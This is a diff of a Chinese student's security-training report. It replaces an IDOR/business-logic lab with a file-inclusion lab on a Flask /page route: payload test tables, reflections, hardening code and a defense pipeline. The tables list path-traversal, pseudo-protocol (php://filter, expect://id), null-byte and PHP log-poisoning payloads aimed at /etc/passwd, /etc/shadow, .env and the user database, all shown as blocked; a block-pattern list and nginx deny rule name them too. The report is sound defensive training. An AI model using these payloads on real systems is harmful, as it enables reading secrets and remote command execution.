-| TC-I01 | 登录admin访问 `/profile` | 显示admin本人信息 |
-| TC-I02 | 登录admin访问 `/profile?user_id=2` | 仍显示admin（参数被忽略） |
-| TC-I03 | 登录alice访问 `/profile` | 显示alice本人信息 |
-| TC-I04 | 未登录访问 `/profile` | 302跳转登录 |
+| 编号 | Payload | 预期结果 |
+|------|---------|----------|
+| TC-L01 | `?name=help` | ✅ 正常显示帮助中心 |
+| TC-L02 | `?name=../app.py` | ✅ 拦截：页面不存在 |
+| TC-L03 | `?name=../../../etc/passwd` | ✅ 拦截 |
+| TC-L04 | `?name=../../../../etc/shadow` | ✅ 拦截 |
+| TC-L05 | `?name=../.env` | ✅ 拦截 |
+| TC-L06 | `?name=../data/users.db` | ✅ 拦截 |
+| TC-L07 | `?name=../templates/login.html` | ✅ 拦截 |
 
-### 8.2 金额校验
+### 8.2 伪协议攻击
 
-| 编号 | amount输入 | 预期结果 |
-|------|-----------|----------|
-| TC-I05 | `50` | 充值成功 |
-| TC-I06 | `0.01` | 充值成功（下限边界） |
-| TC-I07 | `100000` | 充值成功（上限边界） |
-| TC-I08 | `-500` | 拦截：金额必须大于0 |
-| TC-I09 | `0` | 拦截：金额必须大于0 |
-| TC-I10 | `0.001` | 拦截：最低充值0.01元 |
-| TC-I11 | `100001` | 拦截：最高充值100000元 |
-| TC-I12 | `abc` | 拦截：金额格式错误 |
-| TC-I13 | `1.234` | 拦截：金额格式错误 |
-| TC-I14 | `1e5` | 拦截：金额格式错误 |
-| TC-I15 | `1\n00` | 拦截：金额格式错误 |
-| TC-I16 | `--100` | 拦截：金额格式错误 |
-| TC-I17 | `0x10` | 拦截：金额格式错误 |
+| 编号 | Payload | 预期结果 |
+|------|---------|----------|
+| TC-L08 | `?name=file:///etc/passwd` | ✅ 拦截：页面不存在 |
+| TC-L09 | `?name=php://filter/convert.base64-encode/resource=app.py` | ✅ 拦截 |
+| TC-L10 | `?name=data://text/plain;base64,...` | ✅ 拦截 |
+| TC-L11 | `?name=expect://id` | ✅ 拦截 |
 
-### 8.3 限流 + 日志
+### 8.3 特殊字符绕过
 
-| 编号 | 操作 | 预期结果 |
-|------|------|----------|
-| TC-I18 | 同一IP连续充值10次 | 前10次成功 |
-| TC-I19 | 第11次充值 | 拦截：充值过于频繁 |
-| TC-I20 | 检查 logs/balance.log | 包含时间+用户+IP+金额+余额 |
+| 编号 | Payload | 预期结果 |
+|------|---------|----------|
+| TC-L12 | `?name=help%00.txt` | ✅ 拦截 |
+| TC-L13 | User-Agent: `<?php system('id');?>` + 日志路径 | ✅ 拦截 |
 
-### 8.4 脱敏
+### 8.4 合法功能正常
 
 | 编号 | 操作 | 预期结果 |
 |------|------|----------|
-| TC-I21 | admin查看个人中心 | 邮箱显 a***@example.com |
-| TC-I22 | admin查看个人中心 | 手机显 138****8000 |
+| TC-L14 | `?name=help` 正常页面 | ✅ 帮助中心内容完整 |
+| TC-L15 | `?name=notexist` 陌生页 | ✅ 页面不存在 |
 
-### 8.5 原有功能不变
+### 8.5 原有业务功能不变
 
 | 编号 | 操作 | 预期结果 |
 |------|------|----------|
-| TC-I23 | 注册新用户 | 302跳转登录页 |
-| TC-I24 | admin登录 | 欢迎回来 |
-| TC-I25 | 搜索alice | 结果表格含脱敏数据 |
-| TC-I26 | 上传真实PNG | UUID命名+预览 |
-| TC-I27 | 找回密码 | 手机验证+重置成功 |
+| TC-L16 | 注册新用户 | 302跳转登录页 |
+| TC-L17 | admin登录 | 欢迎回来 |
+| TC-L18 | 搜索alice | 结果表格含脱敏数据 |
+| TC-L19 | 上传真实PNG | UUID命名+预览 |
+| TC-L20 | 个人中心profile | 脱敏显示 |
+| TC-L21 | 充值有效金额 | 余额更新+日志记录 |
 
 ---
 
 ## 九、实验总结与心得体会
 
-### 9.1 四天实训的完整脉络
+### 9.1 文件包含漏洞的"隐蔽性"与"破坏性"
 
-今天（Day4）是连续实训的最后一天，四天学到的内容恰好覆盖了Web漏洞中最主流的四类：
+今天的实训让我对文件包含漏洞有了全新的认识。之前在课堂上听讲师活泼大壮讲"文件包含漏洞"时，总觉得这个漏洞很"冷门"——不像SQL注入或文件上传那样有直观的概念。但今天亲手在 `/page` 路由上验证了全部攻击Payload后，才发现这个漏洞的破坏力远超预期：
 
-| 天数 | 主题 | 核心攻击手法 | 核心防御原则 |
-|------|------|-------------|-------------|
-| Day1 | SQL注入 | ' UNION SELECT，7步手工注入 | 参数化查询 |
-| Day2 | WAF绕过 | 换行/注释/双层编码变形 | 纵深防御 |
-| Day3 | 文件上传 | 路径穿越/图片马/双后缀 | 白名单+魔数 |
-| Day4 | 越权+业务逻辑 | IDOR参数篡改/负数金额 | 绝不信任前端 |
+- `../app.py` 一行就能把整个项目的源码全部拉下来
+- `../../../etc/passwd` 三行就能看到系统所有用户
+- `../data/users.db` 直接能拖取整个数据库
 
-今天的课让我感受最深的是：**前面三天的漏洞还需要一些技术水平去构造Payload，今天的越权完全是"改个数字就能搞定"**。讲师在第一场培训中演示的案例也是这样，把URL里的id从123改成124就看到了别人的订单。Burp Intruder一发出去，几千条数据几秒钟到手——没有任何技术含量，纯靠服务端"太懒"没做校验。
+讲师在课堂上演示的一个案例我印象很深：某个网站通过文件包含读取了Jenkins的 `credentials.xml`，直接拿到了云服务的AccessKey。今天我的实践也验证了——`../` 加上 `os.path.join` 不加过滤，就能把这个项目五天来迭代的全部功能代码、用户数据、配置信息一网打尽。
 
-### 9.2 "前端校验等于没做"——第二场培训的核心教训
+### 9.2 "三层防御"远比"一层过滤"可靠
 
-第二场培训讲师的一句话我记下来了：**"前端校验的唯一作用是减少正常用户的误操作，对于攻击者来说等于没有"**。
+加固前的原始代码只有一个逻辑：检查文件是否存在 + 自动补 `.html` 后缀。这个逻辑完全考虑的是"功能好不好用"，完全没有考虑"如果用户传 `../app.py` 怎么办"。
 
-这次实训完全验证了这一点。原始代码的充值表单在前端写了一个 `min="0"` 的HTML属性，看起来好像限制了负数。但用Burp抓包后：
+讲师今天讲的"三层防御方案"我认真记下来了：
 
 ```
-原始请求：amount=50
-修改请求：amount=-50000
-点击Forward → 服务器照单全收 → 余额从99999变成49999
+L1 白名单：只允许 help / about / terms → 拦不住 ../ 但能减少攻击面
+L2 路径锁定：normpath + startswith → 从路径上根除 ../ 的效果
+L3 特征过滤：../ ./ file:// php:// data:// → 防御层兜底
 ```
 
-整个绕过过程不到3秒。前端写的任何限制——`min`、`max`、`step`、`required`、`disabled`、`hidden`——在Burp面前都是透明的。**所有业务数值的校验必须在服务端完整做一遍**，这是今天最大的收获。
+一开始我觉得"三层是不是太多了"，但当我在测试时意识到——L1白名单可以被 `split` 绕过，L2路径锁定的前提是攻击者不知道 `PAGES_DIR` 的绝对路径，L3特征过滤只能拦截已知的伪协议特征——**任何单层都有绕过方式**，三层叠加才能做到真正的纵深防御。
 
-### 9.3 Session vs 前端参数的信任博弈
+### 9.3 从"功能开发思维"到"安全开发思维"的转变
 
-第二场培训讲师还讲了一个关键原则：**"Session是服务端可信数据源，表单/URL参数是前端不可控数据源，两者不可混用"**。
+这次暴露的问题本质是开发模式的问题。写 `/page` 路由的时候，我脑子里想的全是"用户要能看帮助中心"、"自动补 `.html` 后缀让链接更友好"、"文件不存在要给友好的提示"。**全程都在考虑用户体验，完全没想过安全性。**
 
-这次项目的代码就是典型的反面教材：
+讲师说的一句话直接点到了这个问题的本质：**"功能开发人员默认信任用户输入，安全开发人员默认怀疑用户输入。"**
 
+修复 `/page` 路由时我写的每一行防御代码都带着怀疑：
+
+```python
+# 这行代码之前：用户输入直接拼接
+page_path = os.path.join("pages", name)
+
+# 这行代码之后：假设用户输入都是恶意的
+safe_name = name.replace("../", "").replace("..\\", "")
+safe_name = safe_name.replace("/", "").replace("\\", "")
 ```
-❌ 修复前：session存了你是谁（可信），但又从URL取user_id（不可信）
-❌ 修复前：充值表单隐藏域 user_id（任何人都可以改）
-✅ 修复后：一切身份相关信息只从session读
-✅ 修复后：前端删除所有user_id的传参逻辑
-```
 
-这个设计原则不只是针对越权，SQL注入的参数化查询也是同一道理——**不要信任任何从客户端来的数据**。
+这大概是今天最大的收获——不是学会了写几个绕过Payload，而是建立了一种"默认怀疑"的安全开发思维。
 
-### 9.4 越权与文件上传的危害对比
+### 9.4 与课堂讲师的共鸣点
 
-三天的文件上传防御用上了12步流水线，但越权漏洞的修复只需要核心一行代码——`cur_username = session.get("username")`。行数越少，说明这个问题越"基础"，但危害完全不比文件上传小。
+讲师今天反复强调的一句话："信任用户输入是Web漏洞的万恶之源。"
 
-| 漏洞 | 利用复杂度 | 危害范围 |
-|------|-----------|----------|
-| 文件上传 | 需要构造恶意文件 | 单点getshell |
-| 水平越权 | 改一个数字 | 全部用户数据拖库 |
-| 负数金额 | Burp改一个字段 | 无限套利/盗取资金 |
-
-越权不需要发一个包就能全量拖走用户隐私数据，File upload至少还需要写个图片马。所以越权虽然"简单"，但在生产环境中的危害不容忽视。
-
-### 9.5 纵深防御在越权场景中的应用
-
-前三天学到的纵深防御思想今天同样适用。IDOR的防御不能只有一个session校验：
-
-| 层级 | 防御 | 绕过可能性 |
-|------|------|-----------|
-| ① | session身份（底层） | Session固定攻击 |
-| ② | 脱敏输出 | 脱敏后信息有限 |
-| ③ | 限流 | IP代理池绕过 |
-| ④ | IDOR探测过滤 | 变相互认绕过 |
-| ⑤ | 审计日志 | 事后溯源 |
-
-任何单层都可能被绕过，但多层叠加后攻击成本大幅增加。
+今天的实训彻底验证了这句话。`/page` 路由的所有漏洞——无论是路径遍历、伪协议利用、日志投毒——根源都在于 **"信任了 `request.args.get("name")` 这个值"**。修复方案——白名单、路径锁定、特征过滤——本质上都是**不再信任用户输入**。
 
 ---
 
 ## 十、生产环境拓展优化建议
 
-### 10.1 权限模型引入RBAC
+### 10.1 动态页面改用模板渲染
 
 ```python
-# 当前：只有一种用户类型（admin/user）
-# 生产：引入角色-权限模型
-class Permission:
-    VIEW_PROFILE = 1
-    RECHARGE = 2
-    MANAGE_USERS = 4
+# 当前：直接读取文件内容，用 | safe 渲染
+# 生产：使用 Flask 模板系统
+from flask import render_template_string
 
-ROLE_PERMISSIONS = {
-    "user":     Permission.VIEW_PROFILE | Permission.RECHARGE,
-    "admin":    Permission.VIEW_PROFILE | Permission.RECHARGE | Permission.MANAGE_USERS,
-    "auditor":  Permission.VIEW_PROFILE,
+ALLOWED_PAGES = {"help", "about", "terms"}
+
+@app.route("/page/<page_name>")
+def dynamic_page(page_name):
+    if page_name not in ALLOWED_PAGES:
+        abort(404)
+    return render_template(f"pages/{page_name}.html")
+```
+
+### 10.2 文件读取加入沙箱环境
+
+```python
+# 使用 chroot 或 Docker 容器隔离文件系统
+# 限制 Python 进程可访问的目录范围
+import os
+os.chroot("/opt/Class01/chroot/")  # 将根目录锁定在沙箱内
+```
+
+### 10.3 内容安全策略（CSP）防止XSS
+
+```html
+<!-- 即使 page_content 中包含恶意脚本，CSP也能阻止执行 -->
+<meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; script-src 'none';">
+```
+
+### 10.4 文件内容消毒
+
+```python
+import bleach
+
+# 清理 HTML 中的可执行内容
+safe_content = bleach.clean(
+    page_content,
+    tags=["h1", "h2", "p", "ul", "li", "div", "a"],
+    attributes={"a": ["href"]},
+    strip=True
+)
+```
+
+### 10.5 Nginx 静态文件防御
+
+```nginx
+location /page {
+    # 禁止访问系统敏感路径
+    if ($args ~* "\.\./|file://|php://") {
+        return 403;
+    }
 }
-```
-
-### 10.2 OWASP ASVS访问控制标准
-
-```python
-# OWASP ASVS V4 访问控制验证
-def assert_ownership(resource_owner, current_user):
-    if resource_owner != current_user:
-        log_access_violation(current_user, resource_owner)
-        raise PermissionError("无权访问该资源")
-```
-
-### 10.3 金额字段使用Decimal
-
-```python
-from decimal import Decimal
-
-# 生产环境：整数分存储，避免浮点精度
-amount_cents = int(Decimal(amount_str) * 100)   # 50.00元 → 5000分
-```
-
-### 10.4 Redis分布式限流
-
-```python
-import redis
-r = redis.Redis()
-key = f"recharge_rate:{request.remote_addr}"
-if r.incr(key) > 10:
-    return "限流"
-r.expire(key, 60)
-```
-
-### 10.5 敏感操作二次验证
-
-```python
-# 充值/修改密码等敏感操作增加确认环节
-@app.route("/recharge_confirm", methods=["POST"])
-def recharge_confirm():
-    # 发送短信验证码或邮箱确认码
-    code = generate_code()
-    send_sms(USERS[cur_username]["phone"], f"您的充值验证码：{code}")
-    session["recharge_code"] = code
-    return render_template("recharge_confirm.html")
-```
-
-### 10.6 安全配置汇总
-
-```python
-app.config['SESSION_COOKIE_HTTPONLY'] = True     # 禁止JS读取session
-app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'    # CSRF防护
-app.config['SESSION_COOKIE_SECURE'] = True        # HTTPS Only
-app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
 ```
 
 ---
 
-## 附录：个人中心与充值接口防御流水线（8步）
+## 附录：/page 接口完整安全校验流水线
 
 ```
-用户请求 /profile 或 /recharge
+用户请求 /page?name=<payload>
   ↓
-  ① Session身份检查 (cur_username = session.get)
+  ① L3 危险特征过滤 (blocked_patterns)
+     ├── 目录穿越: ../ ./ \\ 等
+     ├── 伪协议: file:// php:// data:// expect://
+     └── 截断: %00 \x00
   ↓
-  ② 拒绝URL/表单user_id参数（仅用session查询）
+  ② L1 白名单校验 (ALLOWED_PAGES)
+     └── name 提取后的文件名必须在 {help, about, terms} 中
   ↓
-  ③ SQL参数化查询（? 占位符，仅查当前用户）
+  ③ L2 路径规范化 + 目录锁定
+     ├── name 清洗: 去掉 ../ / \ %00
+     ├── 拼接: os.path.join(PAGES_DIR, safe_name + ".html")
+     ├── 规范化: os.path.normpath(page_path)
+     └── 前缀校验: real_path.startswith(PAGES_DIR)
   ↓
-  ④ amount正则校验（^\d+(\.\d{1,2})?$）
-  ↓
-  ⑤ amount正负+上下限检查（>0, >=0.01, <=100000）
-  ↓
-  ⑥ IP限流（每分钟最多10次）
-  ↓
-  ⑦ 敏感数据脱敏输出（mask_phone/mask_email）
-  ↓
-  ⑧ 审计日志记录（logs/balance.log）
+  ④ 文件存在检查 → 读取内容 → 模板渲染
+     └── 不存在 → 返回"页面不存在"
 ```
 
 *报告人：大二网络安全实训生*
-*日期：2026年7月22日*
+*日期：2026年7月23日*
